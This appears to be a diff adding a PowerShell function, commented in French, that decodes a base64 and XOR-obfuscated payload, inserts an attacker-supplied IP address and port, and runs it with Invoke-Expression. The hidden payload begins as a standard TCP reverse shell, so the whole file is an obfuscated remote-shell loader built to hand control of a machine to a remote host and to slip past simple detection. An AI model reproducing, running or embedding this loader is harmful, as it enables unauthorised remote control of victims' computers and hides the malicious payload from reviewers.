@@ -1,0 +1,23 @@
+function loader {
+    param(
+        [string]$ip,
+        [int]$port
+    )
+
+    # Payload chiffré (remplace ici par le contenu de payload.txt)
+    $encoded = "M3R7fnJ5YzcqN1lyYDpYdX1ydGM3RG5kY3J6OVlyYzlEeHR8cmNkOUNUR1R7fnJ5Yz8wQ1hZSF5HMDtDWFlIR1hFQz4sGh0zZGNlcnZ6Nyo3M3R7fnJ5YzlQcmNEY2Vydno/PiwaHUx1bmNyTEpKM3VuY3JkNyo3Jzk5ISIiJCJrMmwnaiwaHWB/fntyPz8zfjcqNzNkY2Vydno5RXJ2cz8zdW5jcmQ7Nyc7NzN1bmNyZDlbcnlwY38+Pjc6eXI3Jz5sGh03M3N2Y3Y3Kjc/WXJgOlh1fXJ0Yzc6Q25ncll2enI3RG5kY3J6OUNyb2M5VkRUXl5SeXR4c355cD45UHJjRGNlfnlwPzN1bmNyZDsnOzczfj4sGh03M2RyeXN1dnR8Nyo3P155YXh8cjpSb2dlcmRkfnh5NzNzdmN2NyUpMSY3azdYYmM6RGNlfnlwNz4sGh03M2RyeXN1dnR8JTcqNzNkcnlzdXZ0fDc8NzBHRDcwNzw3P2dgcz45R3Zjfzc8NzApNzAsGh03M2RyeXN1bmNyNyo3P0xjcm9jOXJ5dHhzfnlwSi0tVkRUXl4+OVByY1VuY3JkPzNkcnlzdXZ0fCU+LBodNzNkY2Vydno5QGV+Y3I/M2RyeXN1bmNyOyc7M2RyeXN1bmNyOVtyeXBjfz4sGh03M2RjZXJ2ejlRe2Jkfz8+Gh1qGh0zdHt+cnljOVR7eGRyPz4aHQ==
+"
+
+    # Déchiffrement XOR (clé 23)
+    $key = 23
+    $bytes = [Convert]::FromBase64String($encoded)
+    $decoded = $bytes | ForEach-Object { $_ -bxor $key }
+    $payload = [System.Text.Encoding]::UTF8.GetString($decoded)
+
+    # Remplacement IP et Port
+    $payload = $payload.Replace("TON_IP", $ip)
+    $payload = $payload.Replace("TON_PORT", $port.ToString())
+
+    # Exécution
+    &("Invoke-Expression") $payload
+}
